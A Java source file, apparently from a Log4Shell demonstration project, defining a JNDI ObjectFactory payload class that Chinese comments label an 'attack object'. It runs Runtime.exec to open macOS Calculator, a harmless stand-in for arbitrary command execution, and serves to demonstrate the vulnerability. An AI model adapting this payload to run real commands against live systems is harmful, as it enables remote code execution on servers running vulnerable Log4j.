package com.huihui.aligo.bug.log4j.demo1;

import javax.naming.Context;
import javax.naming.Name;
import java.util.Hashtable;

/**
 * 这是一个攻击对象
 *
 * @author minghui.y
 * @create 2021-12-12 9:59 下午
 **/
public class AttackObject implements javax.naming.spi.ObjectFactory {

    @Override
    public Object getObjectInstance( Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment ) throws Exception {
        System.out.println("执行攻击代码...");
        //这里打开计算器
        Process exec = Runtime.getRuntime().exec( "open /System/Applications/Calculator.app" );

        return null;
    }
}
